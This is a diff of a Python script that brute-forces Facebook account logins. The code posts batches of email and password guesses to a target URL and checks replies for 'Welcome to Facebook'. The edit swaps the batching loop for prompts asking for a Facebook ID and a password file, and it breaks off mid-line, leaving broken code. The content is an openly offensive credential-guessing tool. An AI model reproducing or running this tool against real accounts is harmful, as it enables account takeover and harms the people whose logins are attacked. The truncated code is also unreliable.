@@ -5,7 +5,6 @@ import sys
 WAIT_TIME = 5
 PASSWD_PER_REQUEST = 1000
 
-
 class bcolors:
     HEADER = '\033[95m'
     OKBLUE = '\033[94m'
@@ -15,7 +14,6 @@ class bcolors:
     ENDC = '\033[0m'
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
-
 
 def banner(argv, usage=False, url=None, users=None):
     print(bcolors.OKBLUE + " __      __                        .___                                             " + bcolors.ENDC)
@@ -43,12 +41,10 @@ def banner(argv, usage=False, url=None, users=None):
         print(bcolors.WARNING + "+ -- --=[Brute forcing target: " +
               url + " with emails: " + str(users) + "" + bcolors.ENDC)
 
-
 def send_request(url, data):
     req = requests.post(url, data)
     rsp = req.content.decode('utf-8')
     return rsp
-
 
 def check_response(content, email, passwd):
     if 'Welcome to Facebook' in content:
@@ -63,11 +59,9 @@ def check_response(content, email, passwd):
               "+ -- --=[Invalid response from target" + bcolors.ENDC)
         sys.exit(0)
 
-
 def template(entries):
     t = 'email=%s&pass=%s'
     return '&'.join([t % (entry.get('email'), entry.get('passwd')) for entry in entries])
-
 
 def attack(entries):
     if len(entries) < 1:
@@ -75,13 +69,11 @@ def attack(entries):
     t = template(entries)
     return send_request(url, t)
 
-
 def find_one(entries):
     for entry in entries:
         t = template([entry])
         content = send_request(url, t)
         check_response(content, entry.get('email'), entry.get('passwd'))
-
 
 if __name__ == '__main__':
     if len(sys.argv) < 3:
@@ -98,14 +90,10 @@ if __name__ == '__main__':
 
     entries = []
     for email in emails:
-        print("email: %s" % email)
+        print("Enter email address (as username):", email)
+        facebook_id = input("Enter Facebook ID:")
+        password_file = input("Enter the password file name:")
+        print("")
+
         for num in range(0, len(passwds)):
-            if len(entries) == PASSWD_PER_REQUEST:
-                if "Welcome to Facebook" in attack(entries):
-                    find_one(entries)
-                entries = []
-                time.sleep(WAIT_TIME)
-            entries.append({"email": email, "passwd": passwds[num]})
-        if "Welcome to Facebook" in attack(entries):
-            find_one(entries)
-        entries = []
+            if len(entries) == PASS
